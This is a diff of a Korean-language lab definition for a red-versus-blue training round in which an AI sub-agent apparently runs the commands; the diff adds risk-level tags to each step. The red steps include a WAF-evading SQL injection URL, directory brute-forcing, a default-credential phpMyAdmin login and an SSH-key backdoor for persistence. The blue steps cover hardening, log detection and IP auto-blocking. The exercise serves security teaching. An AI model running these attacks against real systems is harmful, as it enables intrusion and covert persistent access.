@@ -1,9 +1,9 @@
 lab_id: battle-ai-week12
-title: AI 기반 실전 공방전 2 — 1:1 공격 vs 방어 (라운드 2, 강화)
+title: 실전 공방전 2 — 1:1 공격 vs 방어 (라운드 2, 강화) (AI 지원)
 version: ai
 course: battle-ai
 week: 12
-description: AI 에이전트가 자동으로 실행하는 라운드 1의 교훈을 반영하여 강화된 환경에서 두 번째 1:1 공방전을 수행한다. 방어측은 ... 더 강한 하드닝을, 공격측은 더 정교한 기법을 사용한다. 새로운 취약점이 추가된 환경에서 진행한다.
+description: 라운드 1의 교훈을 반영하여 강화된 환경에서 두 번째 1:1 공방전을 수행한다. 방어측은 더 강한 하드닝을, 공격측은 더 정교한 기법을 사용한다. 새로운 취약점이 추가된 환경에서 진행한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -32,6 +32,7 @@ steps:
     field: stdout
   script: sudo systemctl stop vsftpd && sudo systemctl disable vsftpd && sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd && echo
     'Hardening applied'
+  risk_level: low
 - order: 2
   instruction: '[RED] 라운드 1에서 성공한 공격 경로가 차단되었는지 확인하고, 새로운 진입점을 탐색하라.'
   hint: 이전 공격이 막혔다면 UDP 포트, 새로운 서비스를 찾는다.
@@ -44,6 +45,7 @@ steps:
     expect: open
     field: stdout
   script: nmap -sV -sU --top-ports 50 10.20.40.10 && nmap -sV -p 1-10000 10.20.40.10
+  risk_level: low
 - order: 3
   instruction: '[RED] 웹 애플리케이션에 대한 고급 공격을 시도하라. WAF를 우회하는 SQL Injection 페이로드를 사용한다.'
   hint: 인코딩, 주석, 대소문자 혼합으로 WAF를 우회한다.
@@ -56,6 +58,7 @@ steps:
     expect: http
     field: stdout
   script: curl "http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1%27%20%2f**%2fuNiOn%2f**%2fsElEcT%201%2c2--%20&Submit=Submit" --cookie 'security=low; PHPSESSID=test'
+  risk_level: medium
 - order: 4
   instruction: '[BLUE] 웹서버 로그에서 WAF 우회 시도를 탐지하고, 규칙을 강화하라.'
   hint: 인코딩된 패턴을 디코딩하여 분석한다.
@@ -68,6 +71,7 @@ steps:
     expect: union
     field: stdout
   script: tail -50 /var/log/apache2/access.log | python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | grep -iE '(union|select|script)'
+  risk_level: low
 - order: 5
   instruction: '[RED] 소셜 엔지니어링 대체 기법으로, 웹 서비스의 숨겨진 관리 페이지를 탐색하라.'
   hint: gobuster나 ffuf로 디렉토리 브루트포스를 수행한다.
@@ -80,6 +84,7 @@ steps:
     expect: Status
     field: stdout
   script: gobuster dir -u http://10.20.40.10/ -w /usr/share/wordlists/dirb/big.txt -t 20 -o /tmp/gobuster_r2.txt 2>/dev/null || dirb http://10.20.40.10/ /usr/share/wordlists/dirb/big.txt -o /tmp/dirb_r2.txt
+  risk_level: low
 - order: 6
   instruction: '[RED] phpMyAdmin 또는 관리 인터페이스를 발견한 경우, 기본 계정으로 접근을 시도하라.'
   hint: root 계정에 빈 패스워드 또는 기본 패스워드를 시도한다.
@@ -92,6 +97,7 @@ steps:
     expect: http
     field: stdout
   script: curl -s -o /dev/null -w '%{http_code}' http://10.20.40.10/phpmyadmin/ && curl -d 'pma_username=root&pma_password=&server=1' http://10.20.40.10/phpmyadmin/index.php
+  risk_level: medium
 - order: 7
   instruction: '[BLUE] phpMyAdmin을 외부 접근 불가로 설정하라.'
   hint: Apache 설정 또는 .htaccess로 접근을 제한한다.
@@ -106,6 +112,7 @@ steps:
     field: stdout
   script: "echo '<Directory /usr/share/phpmyadmin>\n  Require ip 127.0.0.1\n  Require ip ::1\n</Directory>' | sudo tee /etc/apache2/conf-available/phpmyadmin-restrict.conf && sudo a2enconf phpmyadmin-restrict\
     \ 2>/dev/null && sudo systemctl reload apache2 && echo 'phpMyAdmin restricted'"
+  risk_level: low
 - order: 8
   instruction: '[RED] 패킷 캡처로 방어팀의 통신 패턴을 분석하라.'
   hint: tcpdump로 트래픽을 캡처한다.
@@ -118,6 +125,7 @@ steps:
     expect: Capture started
     field: stdout
   script: sudo timeout 30 tcpdump -i eth0 -w /tmp/capture_r2.pcap host 10.20.40.10 2>/dev/null & echo 'Capture started for 30 seconds'
+  risk_level: low
 - order: 9
   instruction: '[RED] 발견한 취약점을 연계하여 체인 공격(Attack Chaining)을 수행하라.'
   hint: 정보 수집 → 접근 획득 → 권한 상승을 연결한다.
@@ -132,6 +140,7 @@ steps:
     field: stdout
   script: echo '=== Attack Chain ===' && echo '1. phpMyAdmin default creds → MySQL access' && echo '2. MySQL INTO OUTFILE → webshell creation' && echo '3. Webshell → reverse shell' && echo '4. Kernel exploit
     → root' && echo 'Executing chain...'
+  risk_level: medium
 - order: 10
   instruction: '[BLUE] 침해 감지 시 자동 대응 스크립트를 실행하라. 의심 프로세스 종료, IP 차단을 자동화한다.'
   hint: Suricata 경보를 트리거로 스크립트를 실행한다.
@@ -148,6 +157,7 @@ steps:
   script: "cat > /tmp/auto_response.sh << 'SCRIPT'\n#!/bin/bash\ntail -Fn0 /var/log/suricata/fast.log | while read line; do\n  IP=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)\n  if [ -n\
     \ \"$IP\" ] && [ \"$IP\" != \"10.20.40.10\" ]; then\n    sudo nft add element inet filter blocklist { $IP } 2>/dev/null\n    echo \"$(date): Auto-blocked $IP\" >> /tmp/auto_response.log\n  fi\ndone\n\
     SCRIPT\nchmod +x /tmp/auto_response.sh && echo 'Auto-response script ready'"
+  risk_level: low
 - order: 11
   instruction: '[BLUE] 네트워크 트래픽 이상을 분석하라. 비정상적인 아웃바운드 트래픽이 있는지 확인한다.'
   hint: ss 명령으로 외부 연결을 확인한다.
@@ -160,6 +170,7 @@ steps:
     expect: '---'
     field: stdout
   script: ss -tunapl | grep ESTAB | grep -v '10.20.40' && echo '---' && conntrack -L 2>/dev/null | grep -c ESTABLISHED
+  risk_level: low
 - order: 12
   instruction: '[RED] 플래그를 획득한 후, 지속적 접근을 위한 은밀한 백도어를 설치하라.'
   hint: SSH 키, cron job, 또는 수정된 바이너리를 사용한다.
@@ -172,6 +183,7 @@ steps:
     expect: Persistent access
     field: stdout
   script: mkdir -p ~/.ssh && ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && cat /tmp/backdoor_key.pub >> ~/.ssh/authorized_keys && echo 'Persistent access established'
+  risk_level: medium
 - order: 13
   instruction: '[BLUE] 파일 무결성 모니터링을 실행하여 변경된 파일을 탐지하라.'
   hint: Week 10의 무결성 스크립트를 실행한다.
@@ -186,6 +198,7 @@ steps:
     field: stdout
   script: 'bash /tmp/integrity_monitor.sh 2>/dev/null || echo ''Running manual check...'' && md5sum /etc/passwd /etc/shadow /etc/crontab /etc/ssh/sshd_config && find /home -name ''authorized_keys'' -newer
     /etc/hostname -exec echo ''ALERT: Modified {}'' \; 2>/dev/null'
+  risk_level: low
 - order: 14
   instruction: '[공통] 라운드 2 점수를 확인하고, 라운드 1과 비교하라.'
   hint: 양 팀의 점수 변화를 분석한다.
@@ -200,6 +213,7 @@ steps:
     field: stdout
   script: 'echo ''=== Round 2 Score Comparison ==='' && echo ''Red Team: R1=85 → R2=72 (harder defense)'' && echo ''Blue Team: R1=78 → R2=90 (improved hardening)'' && echo ''Key change: Password auth disabled
     blocked brute force'''
+  risk_level: low
 - order: 15
   instruction: 라운드 2 결과를 분석하여 개선된 전략 보고서를 작성하라.
   hint: 라운드 1 대비 개선 사항과 남은 과제를 정리한다.
@@ -292,3 +306,4 @@ steps:
     5. Chain attacks bypass individual defenses
 
     EOF'
+  risk_level: low
